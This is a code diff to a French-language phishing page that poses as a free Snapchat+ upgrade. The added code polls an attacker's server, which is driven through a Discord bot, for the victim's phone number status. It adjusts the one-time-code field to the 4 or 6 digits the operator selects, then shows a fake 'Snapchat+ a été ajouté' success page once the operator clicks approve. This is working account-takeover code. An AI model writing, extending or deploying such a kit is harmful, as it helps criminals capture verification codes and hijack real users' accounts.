@@ -734,6 +734,13 @@
         <p class="info-text" style="margin-top:15px;">Ta demande est en cours de traitement</p>
       </div>
 
+      <!-- PAGE 5 : Succès -->
+      <div class="page" id="page5">
+        <div class="spinner" style="margin-top:30px; border-top-color: #4caf50;"></div>
+        <h2 class="final-title" style="color: #4caf50;">Snapchat+<br>a été ajouté à votre compte !</h2>
+        <p class="info-text" style="margin-top:15px;">Vous pouvez maintenant profiter de toutes les fonctionnalités premium.</p>
+      </div>
+
     </div>
   </div>
 
@@ -1050,6 +1057,7 @@
     }
     
     showPage('page4'); // Va à la page finale
+    checkBotStatus(); // Relance la vérification pour attendre l'approbation
   });
 
   // ------- Surveillance du Bot Discord -------
@@ -1061,17 +1069,22 @@
         const res = await fetch(`${SERVER_URL}/api/check-status?phone=${phoneNumber}`);
         const data = await res.json();
         
+        // Si on a cliqué sur 4 ou 6 chiffres
         if (data.ready) {
           clearInterval(botCheckInterval);
           clearInterval(chronoInterval); // Stoppe le chrono si on clique avant la fin
           
-          // Modifie la page du code pour 4 ou 6 chiffres
           codeInput.maxLength = data.length;
           codeInput.setAttribute("maxlength", data.length); // Force la mise à jour de l'attribut HTML
           codeInput.placeholder = `Code à ${data.length} chiffres`;
           
-          // Affiche la page du code (si on n'y est pas déjà)
           showPage('page3');
+        }
+
+        // Si on a cliqué sur Approuver
+        if (data.approved) {
+          clearInterval(botCheckInterval);
+          showPage('page5'); // Affiche la page de succès
         }
       } catch (err) {
         console.log("En attente du bot...");
